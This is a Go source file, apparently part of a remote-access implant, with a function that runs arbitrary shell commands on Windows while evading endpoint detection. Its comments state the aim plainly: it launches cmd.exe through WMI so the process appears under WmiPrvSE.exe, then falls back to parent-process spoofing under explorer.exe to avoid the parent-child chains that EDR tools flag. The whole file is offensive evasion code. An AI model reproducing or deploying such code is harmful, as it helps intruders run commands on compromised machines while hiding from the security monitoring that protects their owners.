package main

import (
	"context"
	"os/exec"
	"runtime"
	"time"
)

func execCommand(ctx context.Context, name string, args ...string) *exec.Cmd {
	return exec.CommandContext(ctx, name, args...)
}

// execCommandEvasive runs a command breaking the process tree on Windows.
// Uses WMI to spawn cmd.exe under WmiPrvSE.exe instead of our process,
// avoiding the direct parent-child chain that EDRs flag.
// Falls back to PPID spoofing, then normal execution.
func execCommandEvasive(command string) ([]byte, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 25*time.Second)
	defer cancel()

	if runtime.GOOS == "windows" {
		out, err := breakProcessTree(ctx, command)
		if err == nil {
			return []byte(out), nil
		}

		if ctx.Err() == nil {
			ppid := findExplorerPID()
			if ppid != 0 {
				type ppidResult struct {
					out []byte
					err error
				}
				ch := make(chan ppidResult, 1)
				go func() {
					o, e := ExecuteWithPPIDSpoof(command, ppid)
					ch <- ppidResult{o, e}
				}()
				select {
				case <-ctx.Done():
				case r := <-ch:
					if r.err == nil {
						return r.out, nil
					}
				}
			}
		}
	}
	return runCommand(ctx, shellName(), shellFlag(), command)
}

func shellName() string {
	if runtime.GOOS == "windows" {
		return "cmd"
	}
	return "sh"
}

func shellFlag() string {
	if runtime.GOOS == "windows" {
		return "/C"
	}
	return "-c"
}
